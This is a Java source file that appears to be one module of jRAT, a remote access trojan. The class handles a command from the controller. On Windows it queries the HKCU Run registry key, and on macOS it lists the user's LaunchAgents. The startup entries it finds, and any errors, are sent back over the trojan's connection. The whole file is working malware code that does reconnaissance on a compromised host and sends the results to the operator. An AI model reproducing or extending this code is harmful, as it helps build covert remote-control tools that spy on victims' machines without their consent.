package jrat.module.system.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;
import jrat.client.utils.Utils;
import oslib.OperatingSystem;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;


public class Packet78RegistryStartup implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");

					con.addToSendQueue(new Packet53RegistryStartup(args));
				}
				reader.close();
            } else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
                String home = System.getProperty("user.home");

                if (System.getProperty("user.name").equals("root")) {
                    home = "";
                }

                File[] launchAgents =  new File(home + "/Library/LaunchAgents/").listFiles();
                for (File agent : launchAgents) {
                    con.addToSendQueue(new Packet53RegistryStartup(agent.getName()));
                }
            } else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			con.addToSendQueue(new Packet53RegistryStartup("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
